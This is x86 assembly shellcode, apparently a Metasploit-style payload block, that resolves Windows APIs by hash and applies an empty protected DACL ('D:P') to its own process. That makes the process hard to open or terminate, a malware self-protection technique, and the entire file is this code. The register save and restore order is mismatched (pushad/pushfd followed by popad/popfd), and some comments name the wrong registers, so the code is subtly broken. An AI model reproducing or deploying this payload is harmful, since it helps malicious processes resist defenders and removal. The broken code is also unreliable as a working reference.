[BITS 32]
[ORG 0]
 
;   EAX-> Return Values
;   EBX-> Process Handle
;   EBP-> API Block
;   ESI-> Saved ESP
 
    pushad                     ; Save all registers to stack
    pushfd                     ; Save all flags to stack 
    push esp                   ; Push the current esp value
    pop esi                    ; Save the current esp value to ecx
    cld                        ; Clear direction flags
    call start          
	%include "../block_api.asm"; Stephen Fewer's hash API from metasploit project
start:
    pop ebp                    ; Pop the address of SFHA
    push 0x62C64749            ; hash(kernel32.dll, GetCurrentProcessId())
    call ebp                   ; GetCurrentProcessId()
    push eax                   ; Process ID
    push 0x00000000            ; FALSE
    push 0x1F0FFF              ; PROCESS_ALL_ACCESS
    push 0x50B695EE            ; hash(kernel32.dll, OpenProcess)
    call ebp                   ; OpenProcess(PROCESS_ALL_ACCESS,FALSE,ECX)
    mov ebx, eax               ; Move process handle to ebx
    push 0x00000000            ; 0,0
    push 0x32336970            ; pi32
    push 0x61766461            ; adva 
    push esp                   ; Push the address of "advapi32" string
    push 0x0726774C            ; hash(kernel32.dll, LoadLibraryA)
    call ebp                   ; LoadLibraryA("advapi32")
    push 0x00503a44            ; "D:P"
    sub esp,4                  ; Push the address of "D:P" string to stack
    push 0x00000000            ; FALSE
    lea eax, [esp+4]           ; Load the address of 4 byte buffer to EAX
    push eax                   ; Push the 4 byte buffer address
    push 0x00000001            ; SDDL_REVISION_1 
    lea eax, [esp+16]          ; Load the address of "D:P" string to EAX
    push eax                   ; Push the EAX value
    push 0xDA6F639A            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)
    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor("D:P",SDDL_REVISION_1,FALSE) 
    push 0x00000004            ; DACL_SECURITY_INFORMATION
    push ebx                   ; Process Handle
    push 0xD63AF8DB            ; hash(kernel32.dll, SetKernelObjectSecurity)
    call ebp                   ; SetKernelObjectSecurity(ProcessHandle,DACL_SECURITY_INFORMATION,SecurityDescriptor) 
    mov esp,esi                ; Restore the address of esp
    popad                      ; Popback all registers
    popfd                      ; Popback all flags
    ret                        ; <-
